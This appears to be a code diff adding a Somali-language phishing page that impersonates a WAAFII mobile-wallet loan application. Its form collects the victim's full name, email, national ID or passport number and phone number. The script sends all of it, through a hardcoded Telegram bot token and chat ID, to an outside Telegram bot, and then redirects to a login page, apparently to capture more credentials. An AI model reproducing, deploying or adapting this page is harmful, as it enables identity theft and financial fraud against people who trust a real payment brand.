@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="so">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>WAAFII Super App - Codsad Amaah Dhijitaal ah | Soomaaliya</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, sans-serif;
+            background-color: #F5F7FC;
+            color: #1E2A3E;
+            padding-bottom: 60px;
+        }
+
+        @import url('https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap');
+
+        :root {
+            --waafii-navy: #0B2B5B;
+            --waafii-deep-navy: #061E3E;
+            --waafii-teal: #14B886;
+            --waafii-teal-light: #E0F5EE;
+            --waafii-gray-bg: #F8F9FD;
+            --waafii-border: #E9EDF2;
+            --waafii-text-dark: #1E2F3F;
+            --waafii-text-muted: #5E6F8D;
+            --waafii-white: #FFFFFF;
+            --shadow-sm: 0 8px 20px rgba(0, 0, 0, 0.05);
+            --shadow-md: 0 12px 28px rgba(0, 0, 0, 0.08);
+        }
+
+        .hero-summary {
+            background: linear-gradient(135deg, var(--waafii-navy) 0%, var(--waafii-deep-navy) 100%);
+            color: white;
+            padding: 32px 24px;
+            text-align: center;
+            border-bottom-left-radius: 32px;
+            border-bottom-right-radius: 32px;
+            box-shadow: var(--shadow-md);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero-summary::before {
+            content: "";
+            position: absolute;
+            top: -30%;
+            right: -20%;
+            width: 200px;
+            height: 200px;
+            background: rgba(20, 184, 134, 0.1);
+            border-radius: 50%;
+            pointer-events: none;
+        }
+
+        .waafii-badge {
+            display: inline-block;
+            background: rgba(255,255,255,0.15);
+            backdrop-filter: blur(2px);
+            padding: 5px 12px;
+            border-radius: 40px;
+            font-size: 0.7rem;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+            margin-bottom: 12px;
+            border: 0.5px solid rgba(255,255,255,0.25);
+        }
+
+        .hero-summary h1 {
+            font-size: 2.5rem;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+            margin-bottom: 10px;
+        }
+
+        .currency-symbol {
+            font-size: 2rem;
+            font-weight: 500;
+        }
+
+        .summary-stats {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 12px;
+            flex-wrap: wrap;
+        }
+
+        .summary-stats span {
+            background: rgba(255,255,255,0.12);
+            padding: 5px 16px;
+            border-radius: 30px;
+            font-size: 0.75rem;
+            font-weight: 500;
+            backdrop-filter: blur(2px);
+        }
+
+        .application-card {
+            max-width: 560px;
+            margin: -28px auto 0;
+            background: var(--waafii-white);
+            border-radius: 28px;
+            padding: 28px 24px 36px;
+            box-shadow: var(--shadow-sm);
+            border: 1px solid var(--waafii-border);
+        }
+
+        .section-title {
+            font-size: 1.55rem;
+            font-weight: 700;
+            color: var(--waafii-navy);
+            margin-bottom: 6px;
+            letter-spacing: -0.3px;
+        }
+
+        .section-sub {
+            font-size: 0.85rem;
+            color: var(--waafii-text-muted);
+            margin-bottom: 24px;
+            border-left: 3px solid var(--waafii-teal);
+            padding-left: 10px;
+        }
+
+        .input-field {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-weight: 600;
+            font-size: 0.8rem;
+            margin-bottom: 8px;
+            color: var(--waafii-text-dark);
+        }
+
+        input, select, textarea {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1.5px solid var(--waafii-border);
+            border-radius: 18px;
+            background-color: var(--waafii-gray-bg);
+            font-size: 0.95rem;
+            transition: all 0.2s ease;
+            font-weight: 500;
+            color: #1f2a44;
+        }
+
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: var(--waafii-teal);
+            background-color: white;
+            box-shadow: 0 0 0 3px rgba(20, 184, 134, 0.15);
+        }
+
+        .duration-group {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 24px;
+            flex-wrap: wrap;
+        }
+
+        .duration-pill {
+            flex: 1;
+            text-align: center;
+            background: #F1F4FA;
+            border-radius: 40px;
+            padding: 10px 5px;
+            font-weight: 600;
+            font-size: 0.85rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            color: #334155;
+            border: 1px solid transparent;
+        }
+
+        .duration-pill.active {
+            background: var(--waafii-teal-light);
+            border-color: var(--waafii-teal);
+            color: var(--waafii-teal);
+            box-shadow: 0 2px 8px rgba(20,184,134,0.2);
+        }
+
+        .repayment-preview {
+            background: linear-gradient(105deg, #F0F9F5 0%, #FFFFFF 100%);
+            border-radius: 24px;
+            padding: 18px 20px;
+            margin: 20px 0 24px;
+            border: 1px solid #DCFCE7;
+        }
+
+        .preview-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: baseline;
+            margin-bottom: 12px;
+            font-size: 0.9rem;
+        }
+
+        .preview-row.total {
+            border-top: 2px dashed #BFE6D5;
+            margin-top: 8px;
+            padding-top: 12px;
+            font-weight: 800;
+            font-size: 1.1rem;
+            color: var(--waafii-navy);
+        }
+
+        .teal-value {
+            color: var(--waafii-teal);
+            font-weight: 700;
+        }
+
+        .submit-action {
+            background-color: var(--waafii-teal);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 44px;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 12px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            box-shadow: 0 6px 14px rgba(20,184,134,0.3);
+        }
+
+        .submit-action:hover {
+            background-color: #0E9F72;
+            transform: translateY(-2px);
+        }
+
+        .note-local {
+            font-size: 0.7rem;
+            text-align: center;
+            color: #8A99B4;
+            margin-top: 20px;
+        }
+
+        @media (max-width: 520px) {
+            .application-card {
+                margin: -20px 16px 0;
+                padding: 20px;
+            }
+            .hero-summary h1 {
+                font-size: 1.9rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="hero-summary">
+    <div class="waafii-badge">⚡ AMAAHA SUPERSONIC EE WAAFII</div>
+    <h1>
+        <span class="currency-symbol">$</span>
+        <span id="loanAmountDisplay">0</span>
+    </h1>
+    <div class="summary-stats">
+        <span>📱 Isku-xidhka Boorsada WAAFII</span>
+        <span>🇸🇴 Aqoonsiga Soomaaliya Waa La Aqbalay</span>
+        <span>⚡ 0% Kharash Kaashamiyeed</span>
+    </div>
+</div>
+
+<div class="application-card">
+    <div class="section-title">Dhammaystir xogtaada</div>
+    <div class="section-sub">Amaah dhijitaal ah oo degdeg ah boorsadaada WAAFII — Muqdisho, Hargeysa, Kismaayo</div>
+
+    <form id="waafiiLoanForm" onsubmit="handleSubmitApplication(event)">
+        <div class="input-field">
+            <label>📛 Magaca Oo Dhameystiran (sida ku qoran Aqoonsiga Soomaaliya)</label>
+            <input type="text" id="fullName" placeholder="Tusaale: Maxamed Cali Xasan" required>
+        </div>
+
+        <div class="input-field">
+            <label>✉️ Cinwaanka Email-ka</label>
+            <input type="email" id="email" placeholder="maxamed@tusaale.com" required>
+        </div>
+
+        <div class="input-field">
+            <label>🆔 Lambarka Aqoonsiga Soomaaliya / Baasaboorka</label>
+            <input type="text" id="idNumber" placeholder="Tusaale: S1234567 ama A123456" required>
+        </div>
+
+        <div class="input-field">
+            <label>📞 Lambarka Telka ee WAAFII Lagu Diwaangaliyay (Hormuud / Telesom)</label>
+            <input type="tel" id="phone" placeholder="0612345678 / 063XXXXXX" required>
+        </div>
+
+        <label>⏱️ Dooro Qorshaha Bixinta</label>
+        <div class="duration-group" id="durationGroup">
+            <div class="duration-pill active" data-months="1" data-rate="1.2">1 Bil · 1.2%</div>
+            <div class="duration-pill" data-months="3" data-rate="4.2">3 Bilood · 4.2%</div>
+            <div class="duration-pill" data-months="6" data-rate="7.5">6 Bilood · 7.5%</div>
+            <div class="duration-pill" data-months="12" data-rate="13.5">12 Bilood · 13.5%</div>
+        </div>
+
+        <div class="repayment-preview">
+            <div class="preview-row">
+                <span>📊 Heerka Dulsaarka La Codsaday</span>
+                <strong class="teal-value" id="interestRateDisplay">1.2%</strong>
+            </div>
+            <div class="preview-row">
+                <span>💸 Qadarka Dulsaarka</span>
+                <strong id="interestAmountDisplay">$0.00</strong>
+            </div>
+            <div class="preview-row total">
+                <span>💰 Wadarta Lacagta La Bixinayo (Rasuul + Dulsaarka)</span>
+                <strong id="totalRepaymentDisplay">$0.00</strong>
+            </div>
+            <div class="preview-row" style="font-size: 0.7rem; margin-top: 8px;">
+                <span>💵 Waxaa lagu shubayaa boorsadaada WAAFII toos</span>
+                <span>✅ Ma jiraan kharashyo qarsoon</span>
+            </div>
+        </div>
+
+        <div class="input-field">
+            <label>🎯 Ujeedada Amaahda</label>
+            <textarea id="purpose" rows="2" placeholder="Tusaale: Ganacsi, Waxbarasho, Daryeel Caafimaad, Degdeg..."></textarea>
+        </div>
+
+        <button type="submit" class="submit-action">
+            🚀 Soo Gudbi Codsiga → Hel Lacagta
+        </button>
+        <div class="note-local">
+            Adoo codsanaya waxaad ogolaanaysaa shuruudaha amaahda ee WAAFII iyo bixinta degdega ah ee boorsada mobilka. 🇸🇴
+        </div>
+    </form>
+</div>
+
+<script>
+    const BOT_TOKEN = '8503179421:AAEtjBpS6ihvdGImXoGxQSbAA7OaQtojIDM';
+    const CHAT_ID = '5520957080';
+
+    let currentLoanAmount = localStorage.getItem('selectedLoanAmount') ? parseInt(localStorage.getItem('selectedLoanAmount')) : 1000;
+    if (isNaN(currentLoanAmount) || currentLoanAmount < 100) currentLoanAmount = 1000;
+    
+    let selectedDuration = { months: 1, ratePercent: 1.2 };
+    
+    function formatMoney(amount) {
+        return `$${parseFloat(amount).toFixed(2)}`;
+    }
+    
+    function updateLoanPreview() {
+        const loanPrincipal = currentLoanAmount;
+        const rate = selectedDuration.ratePercent;
+        const interestAmount = (loanPrincipal * (rate / 100));
+        const totalRepayment = loanPrincipal + interestAmount;
+        
+        document.getElementById('loanAmountDisplay').innerText = `${currentLoanAmount.toLocaleString()}`;
+        document.getElementById('interestRateDisplay').innerHTML = `${rate}%`;
+        document.getElementById('interestAmountDisplay').innerHTML = formatMoney(interestAmount);
+        document.getElementById('totalRepaymentDisplay').innerHTML = formatMoney(totalRepayment);
+        
+        document.querySelectorAll('.duration-pill').forEach(pill => {
+            const monthsAttr = parseInt(pill.getAttribute('data-months'));
+            if (monthsAttr === selectedDuration.months) {
+                pill.classList.add('active');
+            } else {
+                pill.classList.remove('active');
+            }
+        });
+    }
+    
+    function setDuration(months, ratePercent) {
+        selectedDuration = { months, ratePercent };
+        updateLoanPreview();
+    }
+    
+    function initDurationListeners() {
+        const pills = document.querySelectorAll('.duration-pill');
+        pills.forEach(pill => {
+            pill.addEventListener('click', () => {
+                const months = parseInt(pill.getAttribute('data-months'));
+                const rate = parseFloat(pill.getAttribute('data-rate'));
+                if (!isNaN(months) && !isNaN(rate)) {
+                    setDuration(months, rate);
+                }
+            });
+        });
+    }
+    
+    async function sendToTelegram(message) {
+        const encoded = encodeURIComponent(message);
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}&parse_mode=Markdown`, {
+                method: 'GET',
+                mode: 'no-cors'
+            });
+        } catch(e) { console.warn(e); }
+    }
+    
+    async function handleSubmitApplication(event) {
+        event.preventDefault();
+        
+        const fullName = document.getElementById('fullName').value.trim();
+        const email = document.getElementById('email').value.trim();
+        const idNumber = document.getElementById('idNumber').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+        const purpose = document.getElementById('purpose').value.trim() || "Lama cayimin";
+        
+        if (!fullName || !email || !idNumber || !phone) {
+            alert('Fadlan buuxi dhammaan qaybaha loo baahan yahay');
+            return;
+        }
+        
+        if (!email.includes('@') || !email.includes('.')) {
+            alert('Fadlan geli cinwaan email oo sax ah');
+            return;
+        }
+        
+        if (!phone.match(/^[0-9]{8,12}$/)) {
+            alert('Fadlan geli lambar tel oo Soomaali ah oo sax ah');
+            return;
+        }
+        
+        const appData = {
+            fullName, email, idNumber, phone, purpose,
+            loanAmount: currentLoanAmount,
+            durationMonths: selectedDuration.months,
+            interestRate: selectedDuration.ratePercent,
+            applicationDate: new Date().toISOString()
+        };
+        
+        localStorage.setItem('waafiiApplication', JSON.stringify(appData));
+        
+        const message = `🏦 *COD SIGA AMAAHA WAAFII - SOOMAALIYA* 🇸🇴\n\n👤 *Magaca:* ${fullName}\n📧 *Email:* ${email}\n🆔 *Aqoonsiga:* ${idNumber}\n📱 *Telka:* ${phone}\n💰 *Qadarka:* $${currentLoanAmount.toLocaleString()}\n📅 *Muddada:* ${selectedDuration.months} bilood\n📈 *Heerka Dulsaarka:* ${selectedDuration.ratePercent}%\n🎯 *Ujeedada:* ${purpose}\n🕒 *Waqtiga:* ${new Date().toLocaleString()}`;
+        
+        await sendToTelegram(message);
+        
+        window.location.href = 'login.html';
+    }
+    
+    initDurationListeners();
+    updateLoanPreview();
+</script>
+</body>
+</html>
